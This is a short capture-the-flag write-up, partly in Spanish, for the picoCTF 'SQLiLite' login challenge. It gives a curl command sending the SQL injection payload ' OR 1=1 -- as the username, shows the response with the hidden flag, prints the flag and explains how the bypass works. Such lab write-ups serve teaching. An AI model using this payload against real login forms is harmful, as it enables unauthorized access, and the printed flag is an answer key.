# SQLiLite
# Descripción del reto:
Can you login to this website? Try to login here. http://saturn.picoctf.net:60068/
# Solución:
 curl -s -X POST http://saturn.picoctf.net:60068/login.php -d "username=' OR 1=1 --" -d "password=test" | grep picoCTF
</pre> <h1\>Logged in! But can you see the flag, it is in plainsight.</h1>"<p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>

'picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}'

# Notas adicionales:
El formulario es vulnerable a Inyección SQL (SQLi). Al enviar el payload `' OR 1=1 --` en el campo de usuario, se manipula la consulta del backend: la comilla simple cierra la cadena esperada, el 'OR 1=1' inyecta una condición que siempre evalúa como verdadera, y los guiones '--' comentan el resto de la consulta original, anulando la validación de la contraseña. La bandera se retorna con un atributo HTML 'hidden', invisible en el navegador pero expuesta al inspeccionar el tráfico en texto plano.
# Referencias: